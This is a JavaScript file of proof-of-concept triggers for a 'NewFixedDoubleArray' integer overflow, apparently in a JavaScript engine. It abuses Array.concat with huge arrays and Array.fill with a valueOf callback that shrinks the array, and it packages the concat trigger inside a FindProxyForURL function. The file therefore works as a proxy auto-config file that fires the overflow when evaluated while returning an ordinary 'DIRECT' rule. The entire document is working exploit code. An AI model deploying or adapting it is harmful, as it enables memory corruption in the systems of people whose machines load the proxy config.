// 'NewFixedDoubleArray' Integer Overflow PoCs
// Array Concat
function Poc_ArrayConcat() {
    const MB = 1024 * 1024, block_size = 32 * MB;
    array = Array(block_size).fill(1.1);
    array.prop = 1;
    args = Array(2048 * MB / block_size - 2).fill(array);
    args.push(Array(block_size));
    array.concat.apply(array, args);
}

// Array Fill
function Poc_ArrayFill() {
    array = [];
    array.length = 0xffffffff;

    b = array.fill(1.1, 0, { valueOf() {
        array.length = 32;
        array.fill(1.1);
        return 0x80000000;
    }});
}

function FindProxyForURL(url, host) {
    Poc_ArrayConcat();
    // Poc_ArrayFill();

    // No proxy for all sites
    return "DIRECT";
}
